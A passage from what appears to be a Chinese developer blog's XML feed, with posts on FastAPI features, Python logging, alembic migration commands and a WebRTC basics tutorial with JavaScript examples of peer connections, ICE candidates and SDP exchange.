UI和ReDoc</strong>。对于后端API开发来说，能够更加便捷的进行接口调试（一旦尝试过这种体验就回不去了，类似DRF框架），对于前端来说，能够提供一份严格的API文档，方便同步开发（为了接口规范，最好还是开发之前设计好架构，商议确定接口路径和参数，开发中的API总是和结果不一样的）。</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><h3 id="校验和解析"><a href="#校验和解析" class="headerlink" title="校验和解析"></a>校验和解析</h3><p>FastAPI最为突出的还是<strong>请求参数的校验和解析</strong>，在Python中数据类型是动态的、自动推断的，我们不否认这是一个很好的特性，但是在Web开发中我们需要协调多个模块，通常这些模块是由不同人员或组完成的，开发语言和规范很难统一，尤其在微服务领域里，这些甚至来自不同组织来完成。因为在后端中能够进行严格参数校验和快速解析，这是非常重要的功能（确保参数类型错误，参数不齐这些低级错误不是来源自身，怼人有自信）。这个功能在Springboot、GoFrame、Laravel中都存在，但是在Python传统web框架Django、Flask中却没有，django有名的扩展插件DRF也不过具有参数校验功能，但是却不具备高效的解析和清晰且便捷的文档。</p><p>Type Hints——<a href="https://peps.python.org/pep-0484/">Python PEP 484提案</a>和Pydantic这个库的出现才改变这个局面，加上Pycharm对Type Hints的完美支持（其实对于生成器和旧模块还没很好支持）使得开发效率有进一步的提升。他强大之处只有体验过才能理解，只需要像静态语言一样对属性名添加类型注释，既可以对输入参数校验，对输出参数进行解析。</p><p>没有开发经验的同学可能没法很好理解，例如Json数据结构目前仍是前后端最流行数据结构体，但是Json数据中对浮点数不支持，因此传输过程Python需要将浮点数float转成字符str，再传到前端，从前端接收同样需要由str转float，如果前端传输数据不规范，传过来的整数非字符类型，而是数字类型，类型转换就会出错。又或者是前端传输参数缺少的情况。</p><p>虽然通过繁琐且复杂的校验和解析能够避免这些情况（为了推卸责任，不能不写😘），但是同Pydantic（Cython实现）实现的功能对比，还是不要重复造轮子了，有那时间同学们不想打游戏吗？或者学习？</p><h4 id="在IDE中"><a href="#在IDE中" class="headerlink" title="在IDE中"></a>在IDE中</h4><ul><li>自动补全</li><li>类型检查</li></ul><h4 id="数据校验"><a href="#数据校验" class="headerlink" title="数据校验"></a>数据校验</h4><ul><li>在校验失败时自动生成清晰的错误信息</li><li>对多层嵌套的 JSON 对象依然执行校验</li></ul><h4 id="转换-来自网络请求的输入数据为-Python-数据类型。包括以下数据"><a href="#转换-来自网络请求的输入数据为-Python-数据类型。包括以下数据" class="headerlink" title="转换 来自网络请求的输入数据为 Python 数据类型。包括以下数据"></a>转换 来自网络请求的输入数据为 Python 数据类型。包括以下数据</h4><ul><li>JSON</li><li>路径参数</li><li>查询参数</li><li>Cookies</li><li>请求头</li><li>表单</li><li>文件</li></ul><h4 id="转换-输出的数据：转换-Python-数据类型为供网络传输的-JSON-数据"><a href="#转换-输出的数据：转换-Python-数据类型为供网络传输的-JSON-数据" class="headerlink" title="转换 输出的数据：转换 Python 数据类型为供网络传输的 JSON 数据"></a>转换 输出的数据：转换 Python 数据类型为供网络传输的 JSON 数据</h4><ul><li>转换 Python 基础类型 （<code>str</code>、 <code>int</code>、 <code>float</code>、 <code>bool</code>、 <code>list</code> 等）</li><li><code>datetime</code> 对象</li><li><code>UUID</code> 对象</li><li>数据库模型</li><li>……以及更多其他类型</li></ul><h4 id="自动生成的交互式-API-文档，包括两种可选的用户界面"><a href="#自动生成的交互式-API-文档，包括两种可选的用户界面" class="headerlink" title="自动生成的交互式 API 文档，包括两种可选的用户界面"></a>自动生成的交互式 API 文档，包括两种可选的用户界面</h4><ul><li>Swagger UI</li><li>ReDoc</li></ul><h3 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h3><p>Python是动态语言，轻易修改运行时变量对象，即依赖注入。不同于静态语言预编译程序有严格检查，且编译和运行时处于不同内容，Python则能够轻松修改。FastAPI框架自身提供了依赖注入的方式实现数据库连接获取，身份认证，Session和Cookie解析等中间件功能。这里不推荐传统中间件实现方式的理由是，中间件会在每个请求时都执行，消耗内存高，对于不需要的请求增加多余代码运行，降低效率，而依赖注入可以在需要使用的请求上执行，提供很好的解耦，更加优雅。</p><p>依赖注入的实现原理和代码，笔者会在后面的文章中介绍，此处不做讲解。</p><h3 id="安全性及身份验证"><a href="#安全性及身份验证" class="headerlink" title="安全性及身份验证"></a>安全性及身份验证</h3><p>集成了安全性和身份认证。杜绝数据库或者数据模型的渗透风险。</p><p>OpenAPI 中定义的安全模式，包括：</p><ul><li>HTTP 基本认证。</li><li><strong>OAuth2</strong> (也使用 <strong>JWT tokens</strong>)。在 <a href="https://fastapi.tiangolo.com/zh/tutorial/security/oauth2-jwt/">OAuth2 with JWT</a>查看教程。</li><li>API 密钥，在:<ul><li>请求头。</li><li>查询参数。</li><li>Cookies, 等等。</li></ul></li></ul><p>加上来自 Starlette（包括 <strong>session cookie</strong>）的所有安全特性。</p><p>所有的这些都是可复用的工具和组件，可以轻松与你的系统，数据仓库，关系型以及 NoSQL 数据库等等集成。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> fastapi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastapi </tag>
            
            <tag> pydantic </tag>
            
            <tag> Python </tag>
            
            <tag> SQLAlchemy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Logging用法</title>
      <link href="/posts/56655.html"/>
      <url>/posts/56655.html</url>
      
        <content type="html"><![CDATA[<h1 id="Logging用法"><a href="#Logging用法" class="headerlink" title="Logging用法"></a>Logging用法</h1><h2 id="打印所有Logger对象"><a href="#打印所有Logger对象" class="headerlink" title="打印所有Logger对象"></a>打印所有Logger对象</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> logging.Logger.manager.loggerDict.keys():</span><br><span class="line">       logger = logging.getLogger(name)</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;name = %s, logger = %s&#x27;</span> % (name, logger))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> logging </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> log </tag>
            
            <tag> logging </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Django连接WebRTC</title>
      <link href="/posts/56655.html"/>
      <url>/posts/56655.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python使用WebRTC"><a href="#Python使用WebRTC" class="headerlink" title="Python使用WebRTC"></a>Python使用WebRTC</h1><h2 id="异步RTC库"><a href="#异步RTC库" class="headerlink" title="异步RTC库"></a>异步RTC库</h2><p>aiortc</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webrtc </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>alembic教程</title>
      <link href="/posts/56655.html"/>
      <url>/posts/56655.html</url>
      
        <content type="html"><![CDATA[<h1 id="alembic教程"><a href="#alembic教程" class="headerlink" title="alembic教程"></a>alembic教程</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="数据库升级到最新版本"><a href="#数据库升级到最新版本" class="headerlink" title="数据库升级到最新版本"></a>数据库升级到最新版本</h3><p><code>alembic upgrade head</code></p><h3 id="生成版本文件"><a href="#生成版本文件" class="headerlink" title="生成版本文件"></a>生成版本文件</h3><p><code>alembic revision --autogenerate -m &quot;操作注释&quot;</code></p><h3 id="降级到最初版本"><a href="#降级到最初版本" class="headerlink" title="降级到最初版本"></a>降级到最初版本</h3><p><code>base</code>是代表最初版本号，也可以降级指定版本号<code>1234567890</code></p><p><code>alembic downgrade base</code></p><h3 id="查询当前版本号"><a href="#查询当前版本号" class="headerlink" title="查询当前版本号"></a>查询当前版本号</h3><p>在数据库中有一个alembic_version的字段，表示的是最后一个版本的版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">alembic命令和参数解释：</span><br><span class="line"></span><br><span class="line">1. init：创建一个alembic仓库。</span><br><span class="line"></span><br><span class="line">2. revision：创建一个新的版本文件。</span><br><span class="line"></span><br><span class="line">3. --autogenerate：自动将当前模型的修改，生成迁移脚本。</span><br><span class="line"></span><br><span class="line">4. -m：本次迁移做了哪些修改，用户可以指定这个参数，方便回顾。</span><br><span class="line"></span><br><span class="line">5. upgrade：将指定版本的迁移文件映射到数据库中，会执行版本文件中的upgrade函数。</span><br><span class="line"></span><br><span class="line">如果有多个迁移脚本没有被映射到数据库中，那么会执行多个迁移脚本。</span><br><span class="line"></span><br><span class="line">6. [head]：代表最新的迁移脚本的版本号。</span><br><span class="line"></span><br><span class="line">7. downgrade：会执行指定版本的迁移文件中的downgrade函数。</span><br><span class="line"></span><br><span class="line">8. heads：展示head指向的脚本文件版本号。</span><br><span class="line"></span><br><span class="line">9. history：列出所有的迁移版本及其信息。</span><br><span class="line"></span><br><span class="line">10. current：展示当前数据库中的版本号。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> SQLAlchemy </tag>
            
            <tag> alembic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebRTC实时音视频通话技术(基础篇)</title>
      <link href="/posts/35158.html"/>
      <url>/posts/35158.html</url>
      
        <content type="html"><![CDATA[<h2 id="WebRTC介绍"><a href="#WebRTC介绍" class="headerlink" title="WebRTC介绍"></a>WebRTC介绍</h2><p>WebRTC 由用于 Web 实时通信的 JavaScript API 和一组通信协议构成，支持网络上的任何已连接设备成为 Web 上潜在的通信端点。WebRTC 已成为线上通信及协作服务的基石。</p><p>2021 年 1 月 26 日，万维网联盟（W3C）和互联网工程任务组（IETF）宣布，Web 实时支持多种服务的通信（WebRTC）现在已成为官方标准，可将音频和视频通信带到 Web 上的任何位置。</p><p>W3C也正在研究将WebRTC运用到物联网设备、会议视频加密、机器学习实时处理音视频等方面，所以学习和掌握WebRTC是很有必要，关注前沿技术有助于我们提升自己，也能将更优秀的方案运用到我们的项目当中。</p><p><a href="https://www.w3.org/TR/webrtc/">WebRTC 标准文档</a></p><p><a href="https://webrtc.org.cn/">WebRTC中文网</a></p><h2 id="WebRTC架构"><a href="#WebRTC架构" class="headerlink" title="WebRTC架构"></a>WebRTC架构</h2><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/20230228210228.png" alt="WebRTC架构图"></p><p>如上图WebRTC的框架包含视频解密编码等，从开发者的角度，初步学习只需要关注紫色的实线框部分，即通过调用Web API实现通信功能。目前FireFox、Chrome等主流浏览器都集成了WebRTC的API，绿色和蓝色实线框部分都属于浏览器厂商需要关注的内容，而蓝色虚线框部分则是服务器厂商需要关注的部分。</p><p>关于WebRTC架构的Session管理层、C++ API层、音视频编码层等具体技术，这里就不详细介绍了。</p><h2 id="WebRTC通信层原理介绍"><a href="#WebRTC通信层原理介绍" class="headerlink" title="WebRTC通信层原理介绍"></a>WebRTC通信层原理介绍</h2><h3 id="实时传输安全协议SRTP"><a href="#实时传输安全协议SRTP" class="headerlink" title="实时传输安全协议SRTP"></a>实时传输安全协议SRTP</h3><blockquote><p>所谓SRTP，即<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E5%AE%9E%E6%97%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/10046352?fromModule=lemma_inlink">安全实时传输协议</a>(Secure Real-time Transport Protocol)，其是在实时传输协议(Real-time Transport Protocol)基础上所定义的一个协议，旨在为<a href="https://baike.baidu.com/item/%E5%8D%95%E6%92%AD/8946201?fromModule=lemma_inlink">单播</a>和<a href="https://baike.baidu.com/item/%E5%A4%9A%E6%92%AD/6867723?fromModule=lemma_inlink">多播</a>应用程序中的实时传输协议的数据提供加密、<a href="https://baike.baidu.com/item/%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81/5388882?fromModule=lemma_inlink">消息认证</a>、完整性保证和重放保护。</p></blockquote><h3 id="媒体协商SDP"><a href="#媒体协商SDP" class="headerlink" title="媒体协商SDP"></a>媒体协商SDP</h3><p>媒体协商是通过对比音视频通信双方所支持的协议，在建立通信之前选择双方或者多方都支持的通信协议。</p><blockquote><p>举例：A端支持VP8编码协议和H.264协议(mp4)，B端支持VP9协议和H.264协议，那么两者需要建立通信，只能选用H.264进行视频编码解码。</p></blockquote><h3 id="网络协商Candidate"><a href="#网络协商Candidate" class="headerlink" title="网络协商Candidate"></a>网络协商Candidate</h3><p>建立端到端通信的双方，需要能够进行IP通信协议的支持，构建持久化连接。当双方其中一方不满足条件，则无法建立连接。常见两种通信方案<code>STUN</code>和<code>TURN</code>。STUN和TURN服务器可由开源项目cotum构建。</p><h3 id="STUN"><a href="#STUN" class="headerlink" title="STUN"></a>STUN</h3><p>当通信双方都具备<code>公网IP</code>和<code>通信端口</code>时，能够建立<code>P2P</code>通信网络，媒体流传输按照P2P方式传输，通信质量只与通信双方的带宽有关。</p><p>很多场景不具备构建P2P网络的条件，<strong>当通信一端处于局域网内，不具备公网IP，或者同IP下端口资源分配完毕，无法提供通信端口时，STUN无法构建P2P网络通信</strong>。NAT无法成功分配IP的情况不少见。</p><h3 id="TURN"><a href="#TURN" class="headerlink" title="TURN"></a>TURN</h3><p>TURN是STUN/RFC5389的一个扩展，主要提供了<code>Replay</code>功能。如果终端在NAT之后，无法进行对等的通信<code>直接通信</code>，这是就可以通过<code>公网服务器作为中继</code>，对数据进行一个转发。该转发协议被称为TURN协议。</p><blockquote><p>可参考VPN架构、MQTT架构理解。</p></blockquote><h3 id="ICE"><a href="#ICE" class="headerlink" title="ICE"></a>ICE</h3><p>ICE是一个框架，该框架整合了STUN和TURN协议。开源项目cotum同样集成了STUN和TURN协议。</p><h3 id="信令服务器-Singnal-Server-lt-–媒体协商-网络协商"><a href="#信令服务器-Singnal-Server-lt-–媒体协商-网络协商" class="headerlink" title="信令服务器(Singnal Server)&lt;–媒体协商+网络协商"></a>信令服务器(Singnal Server)&lt;–媒体协商+网络协商</h3><p>上面讲解了构建实时音视频通信通道的协商内容，这个协商过程就需要通过信令服务器进行数据交互，转发对方的媒体信息和网络信息。</p><blockquote><p>举个例子：A端和B端开始视频通话之前，需要在<strong>客户端APP/网站WEB</strong>向对方提交通话请求并发送媒体协商和网络协商的数据，由服务器转发协商数据到对方终端，双方才互有对方的信息，构建音视频通信通道。<strong>这个APP/WEB就是信令服务器。</strong></p></blockquote><p>因此信令服务器是不局限于开发语言、设备类型、应用类型的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram </span><br><span class="line"># 准备连接</span><br><span class="line">Peer A-&gt;&gt;Singnal Server: connect </span><br><span class="line">Peer B-&gt;&gt;Singnal Server: connect</span><br><span class="line"># 发送媒体协商，其实已经开始Nat，这里省略</span><br><span class="line">Peer A-&gt;&gt;Singnal Server: Send Offer SDP</span><br><span class="line">Singnal Server-&gt;&gt;Peer B: Replay Offer SDP</span><br><span class="line">Peer B-&gt;&gt;Singnal Server: Send Answer SDP</span><br><span class="line">Singnal Server-&gt;&gt;Peer A: Replay Answer SDP</span><br><span class="line"># 媒体协商成功，进行网络协商，向中继服务器连接，如果STUN运行则返回到响应信息里面，TURN亦然</span><br><span class="line">Peer A-&gt;&gt;TURN Server: ICE Request</span><br><span class="line">TURN Server--&gt;&gt;Peer A: onIceCandidate</span><br><span class="line"># 向B端发送网络协商信息</span><br><span class="line">Peer A-&gt;&gt;Singnal Server: Send ICE Candidate</span><br><span class="line">Singnal Server-&gt;&gt;Peer B: Replay ICE Candidate</span><br><span class="line">Peer B-&gt;&gt;Peer B: AddIceCandidate</span><br><span class="line"># B端向中继服务器连接，获取网络协商信息</span><br><span class="line">Peer B-&gt;&gt;TURN Server: ICE Request</span><br><span class="line">TURN Server--&gt;&gt;Peer B: onIceCandidate</span><br><span class="line"># 向A端发送网络协商信息</span><br><span class="line">Peer B-&gt;&gt;Singnal Server: Send ICE Candidate</span><br><span class="line">Singnal Server-&gt;&gt;Peer A: Replay ICE Candidate</span><br><span class="line">Peer A-&gt;&gt;Peer A: AddIceCandidate</span><br><span class="line"></span><br><span class="line"># 发送流媒体</span><br><span class="line">Peer A-&gt;&gt;Peer B: Send Media</span><br><span class="line">Peer A-&gt;&gt;Peer A: onAddStream</span><br><span class="line">Peer B-&gt;&gt;Peer B: onAddStream</span><br><span class="line">Peer B-&gt;&gt;Peer A: Send Media</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Web-API"><a href="#Web-API" class="headerlink" title="Web API"></a>Web API</h2><h3 id="基础API"><a href="#基础API" class="headerlink" title="基础API"></a>基础API</h3><ol><li><code>RTCPeerConnection</code>接口代表一个由本地计算机到远端的 WebRTC 连接。该接口提供了创建，保持，监控，关闭连接的方法的实现。</li><li><code>RTCPeerConnection.createOffer()</code>创建SDP offer信息的函数。</li><li><code>RTCPeerConnection.setLocalDescription()</code> 设置本地 SDP 描述信息。</li><li><code>RTCPeerConnection.setRemoteDescription()</code> 设置远程 SDP 描述信息，即对方的SDP信息。</li><li><code>RTCPeerConnection.createAnswer()</code> 创建SDP answer信息的函数。</li><li><code>RTCIceCandidate()</code> 构建ICE的网络信息对象。</li><li><code>RTCPeerConnection.addIceCandidate()</code> 添加对方的ICECandidate信息。</li></ol><blockquote><p>Web MDN强烈建议使用<a href="https://github.com/webrtcHacks/adapter">Adapter.js</a>补充库。以确保网站或 Web 应用程序的兼容性。</p></blockquote><h3 id="打开麦克风和摄像头"><a href="#打开麦克风和摄像头" class="headerlink" title="打开麦克风和摄像头"></a>打开麦克风和摄像头</h3><p>目前主流的浏览器都支持了<code>getUserMedia</code>获取媒体流，具体API和属性查询MDN，不进行赘述。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">mediaDevices</span>.<span class="title function_">getUserMedia</span>(&#123;</span><br><span class="line">    <span class="attr">video</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">audio</span>: <span class="literal">true</span></span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">stream</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// do something.</span></span><br><span class="line">    <span class="comment">// VideoHtmlElement = stream;</span></span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><h3 id="创建RTC连接"><a href="#创建RTC连接" class="headerlink" title="创建RTC连接"></a>创建RTC连接</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _pc = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;</span><br><span class="line">    <span class="attr">iceServers</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">urls</span>: [<span class="string">&#x27;stun:stun.stunprotocol.org:3478&#x27;</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><h4 id="添加onicecandidate回调函数"><a href="#添加onicecandidate回调函数" class="headerlink" title="添加onicecandidate回调函数"></a>添加onicecandidate回调函数</h4><p>当<code>RTCPeerConnection</code>生成offer SDP或者生成Answer SDP的时候，会自动向<code>iceServers</code>设置的stun/turn服务器获取nat信息，即ice格式的网络信息。</p><p>需要将获取到的candidate信息和通信对方进行交换，完成<code>P2P</code>连接。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _pc = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;</span><br><span class="line">    <span class="attr">iceServers</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">urls</span>: [<span class="string">&#x27;stun:stun.stunprotocol.org:3478&#x27;</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;)</span><br><span class="line">_pc.<span class="property">onicecandidate</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">candidate</span>) &#123;</span><br><span class="line">      <span class="comment">// 通过信令服务器交互网络信息</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;candidate&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e.<span class="property">candidate</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="添加ontrack回调函数"><a href="#添加ontrack回调函数" class="headerlink" title="添加ontrack回调函数"></a>添加ontrack回调函数</h4><p>当<code>RTCPeerConnection</code>完成握手之后，<code>ontrack</code>回调函数获取对方传输过来的媒体流。在这里处理媒体流。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _pc = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;</span><br><span class="line">    <span class="attr">iceServers</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">urls</span>: [<span class="string">&#x27;stun:stun.stunprotocol.org:3478&#x27;</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;)</span><br><span class="line">_pc.<span class="property">onicecandidate</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">candidate</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;candidate&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e.<span class="property">candidate</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">_pc.<span class="property">ontrack</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// do something.</span></span><br><span class="line">    <span class="comment">// VideoHtmlElement = e.streams[0];</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="将本地视频流添加到RTC"><a href="#将本地视频流添加到RTC" class="headerlink" title="将本地视频流添加到RTC"></a>将本地视频流添加到RTC</h3><p><code>localStream</code>来自<code>getUserMedia</code>回调函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">localStream.<span class="title function_">getTracks</span>().<span class="title function_">forEach</span>(<span class="function">(<span class="params">track, index</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (localStream) &#123;</span><br><span class="line">      _pc.<span class="title function_">addTrack</span>(track, localStream)</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;将本地视频流添加到RTC&#x27;</span>, track);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><h3 id="创建SDP-offer"><a href="#创建SDP-offer" class="headerlink" title="创建SDP offer"></a>创建SDP offer</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_pc.<span class="title function_">createOffer</span>(&#123;</span><br><span class="line">    <span class="attr">offerToReceiveAudio</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">offerToReceiveVideo</span>: <span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">sdp</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Offer&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(sdp));</span><br><span class="line">      pc.<span class="title function_">setLocalDescription</span>(sdp);  <span class="comment">// 设置成本地描述信息</span></span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="创建SDP-answer"><a href="#创建SDP-answer" class="headerlink" title="创建SDP answer"></a>创建SDP answer</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pc.<span class="title function_">createOffer</span>(&#123;</span><br><span class="line">    <span class="attr">offerToReceiveAudio</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">offerToReceiveVideo</span>: <span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">sdp</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Offer&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(sdp));</span><br><span class="line">      pc.<span class="title function_">setLocalDescription</span>(sdp); <span class="comment">// 设置成本地描述信息</span></span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里是模拟双方通信的api操作，详情见DEMO。</p></blockquote><h3 id="设置远程SDP信息"><a href="#设置远程SDP信息" class="headerlink" title="设置远程SDP信息"></a>设置远程SDP信息</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> remoteSdp = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(remoteDesc.<span class="property">value</span>!.<span class="property">value</span>);</span><br><span class="line">_pc.<span class="title function_">setRemoteDescription</span>(<span class="keyword">new</span> <span class="title class_">RTCSessionDescription</span>(remoteSdp));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;成功设置远程描述信息&#x27;</span>, remoteSdp);</span><br></pre></td></tr></table></figure><blockquote><p>手动获取输入的话，会发现有多个<code>IceCandidate</code>，一般优先输入 udp的局域网地址进行本地测试即可。或者全部添加。</p></blockquote><h2 id="内容总结"><a href="#内容总结" class="headerlink" 